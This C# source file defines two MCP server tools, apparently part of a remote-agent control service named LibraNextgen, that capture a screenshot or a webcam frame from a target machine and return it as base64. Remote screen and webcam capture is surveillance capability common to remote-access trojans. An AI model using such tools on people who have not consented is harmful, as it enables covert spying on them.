using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class ScreenTools
{
    [McpServerTool, Description("Take a screenshot from an agent's display and wait for the base64 result")]
    public static async Task<string> take_screenshot(
        TaskService taskService,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Timeout in seconds (default 20)")] int timeoutSeconds = 20)
    {
        return await McpUtils.CreateTaskAndWait(
            taskService, agents, agentId, CommandType.Screenshot, "capture", timeoutSeconds);
    }

    [McpServerTool, Description("Capture a frame from the agent's webcam and wait for the base64 result")]
    public static async Task<string> capture_webcam(
        TaskService taskService,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Timeout in seconds (default 20)")] int timeoutSeconds = 20)
    {
        return await McpUtils.CreateTaskAndWait(
            taskService, agents, agentId, CommandType.Webcam, "capture", timeoutSeconds);
    }
}